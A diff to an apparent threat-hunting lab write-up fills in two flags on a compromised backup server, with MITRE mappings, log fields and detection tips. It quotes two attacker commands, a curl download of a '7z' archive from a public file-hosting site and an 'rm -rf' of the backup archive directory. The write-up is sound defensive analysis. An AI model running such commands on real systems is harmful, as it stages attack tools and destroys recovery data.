@@ -426,7 +426,11 @@ DeviceProcessEvents
 <summary id="-flag-8">🚩 <strong>Flag 8: COMMAND AND CONTROL - Tool Transfer</strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Attackers download tools from external infrastructure to carry out the attack.
+
+References:
+
+T1105: Ingress Tool Transfer
 
 ### 📌 Finding
 curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
@@ -436,13 +440,13 @@ curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 | Field | Value |
 |------|-------|
 | Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Timestamp | 2025-11-25T05:45:34.259149Z |
+| Process | curl |
+| Parent Process | bash |
+| Command Line | curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+This activity aligns with Ingress Tool Transfer (MITRE ATT&CK T1105), where adversaries introduce external tools into the environment to enable later stages of the attack. Backup servers rarely require outbound downloads from public hosting services, making this behavior highly anomalous. When observed after lateral movement and reconnaissance, ingress tool transfer strongly indicates the attacker is transitioning from discovery to impact, leaving limited time for defenders to intervene.
 
 ### 🔧 KQL Query Used
 DeviceProcessEvents
@@ -459,7 +463,7 @@ DeviceProcessEvents
 ### 🛠️ Detection Recommendation
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Monitor critical infrastructure systems, especially backup servers, for interactive use of file transfer utilities such as curl or wget making outbound connections to external hosts. Pay particular attention to downloads originating from public file-hosting services, as these are commonly used to stage tools immediately before destructive actions. Correlate tool transfer activity with prior remote access and reconnaissance to identify attacks approaching the impact phase.
 
 </details>
 
@@ -510,7 +514,11 @@ DeviceProcessEvents
 <summary id="-flag-10">🚩 <strong>Flag 10: IMPACT - Data Destruction</strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Destroying backups eliminates recovery options and maximises ransomware impact.
+
+References:
+
+T1485: Data Destruction
 
 ### 📌 Finding
 rm -rf /backups/archives
@@ -521,12 +529,14 @@ rm -rf /backups/archives
 |------|-------|
 | Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T05:47:02.660493Z |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Process | rm |
+| Parent Process | bash |
+| Command Line | rm -rf /backups/archives |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+This activity aligns with Data Destruction (MITRE ATT&CK T1485), where adversaries deliberately delete data to prevent system recovery and maximize operational impact. The use of a recursive deletion command against backup directories indicates intentional destruction of recovery data rather than routine maintenance. 
+
+Once backup data is removed, defenders lose the ability to restore affected systems, significantly increasing the success and leverage of ransomware or destructive attacks.
 
 ### 🔧 KQL Query Used
 DeviceProcessEvents
@@ -563,7 +573,7 @@ DeviceProcessEvents
 ### 🛠️ Detection Recommendation
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Monitor for recursive file deletion commands such as rm -rf executed on backup or recovery systems, particularly when targeting known backup directories. These actions are rarely legitimate and should be treated as high-severity events requiring immediate response. Correlate deletion activity with prior remote access, reconnaissance, and tool transfer to identify attacks that have reached the impact stage.
 
 </details>
 
